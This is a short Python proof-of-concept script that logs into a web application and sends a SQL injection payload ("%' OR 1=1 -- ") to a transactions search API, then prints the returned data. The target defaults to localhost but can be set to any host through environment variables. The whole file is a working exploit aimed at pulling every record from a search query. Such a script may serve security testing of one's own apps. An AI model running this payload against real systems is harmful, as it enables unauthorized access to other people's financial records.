#!/usr/bin/env python3
import os, requests

BASE = os.getenv('TARGET', 'http://127.0.0.1:5000')
USER = os.getenv('USER', 'user')
PASS = os.getenv('PASS', 'pass')
PAYLOAD = os.getenv('Q', "%' OR 1=1 -- ")

s = requests.Session()
s.post(f"{BASE}/login", data={'username': USER, 'password': PASS}, timeout=10)
r = s.get(f"{BASE}/api/v1/transactions/search", params={'q': PAYLOAD}, timeout=10)
print(r.status_code)
print(r.text)
